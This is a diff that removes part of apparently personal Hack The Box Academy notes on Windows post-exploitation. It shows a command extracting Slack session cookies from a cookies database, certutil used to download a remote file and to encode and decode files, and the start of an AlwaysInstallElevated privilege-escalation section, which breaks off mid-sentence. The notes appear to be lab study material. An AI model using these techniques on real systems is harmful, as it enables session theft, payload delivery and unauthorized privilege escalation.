@@ -52,29 +52,3 @@ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slac
 
 The following Parts are skipped, however if we encounter the same item we it might be of our interest to visit https://academy.hackthebox.com/app/module/67/section/1637 again for more information: mRemoteNG, restic, slack
 
-Transferring file with certutil:
-
-We can transfer, encode and decode file with certutil:
-```
-PS C:\htb> certutil.exe -urlcache -split -f <url> <filename>
-```
-
-```
-C:\htb> certutil -encode file1 encodedfile
-
-Input Length = 7
-Output Length = 70
-CertUtil: -encode command completed successfully
-```
-
-```
-C:\htb> certutil -decode encodedfile file2
-
-Input Length = 70
-Output Length = 7
-CertUtil: -decode command completed successfully.
-```
-
-Privilege Escalation with Always Install Elevated:
-
-If Always Install Elevated is enabled, it means that every time when user install application, it will be run in elevated con
